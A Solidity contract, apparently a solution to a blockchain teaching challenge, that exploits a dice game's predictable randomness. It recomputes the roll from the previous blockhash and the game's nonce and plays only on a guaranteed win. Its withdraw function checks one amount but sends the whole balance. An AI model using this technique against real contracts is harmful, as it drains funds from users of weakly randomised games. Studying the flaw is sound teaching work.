pragma solidity >=0.8.0 <0.9.0;  //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
error Transfer__Failed();
error Amount__Exceeds__Total__Balance();
error NotEnoughEther();
error Try__Again();


contract RiggedRoll is Ownable {

    DiceGame public diceGame;
  event Roll(address indexed player, uint256 amount, uint256 roll);


    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.
    function withdraw(address _addr, uint256 _amount) public onlyOwner {

        if(_amount > address(this).balance)
            revert Amount__Exceeds__Total__Balance();

         (bool success,) = payable(address(_addr)).call{value:address(this).balance }("");
        if(!success)
        revert Transfer__Failed();

    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
   
    function riggedRoll() public {
        
        if (address(this).balance < 0.002 ether) 
           revert NotEnoughEther();

        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(diceGame), diceGame.nonce()));
        uint256 roll = uint256(hash) % 16;
    
        if (roll <= 5) {
        diceGame.rollTheDice{value:  0.002 ether}();
        emit Roll(msg.sender, 0.002 ether, roll);
        } else revert Try__Again();

        }
    // Include the `receive()` function to enable the contract to receive incoming Ether.
    receive() external payable {}
}
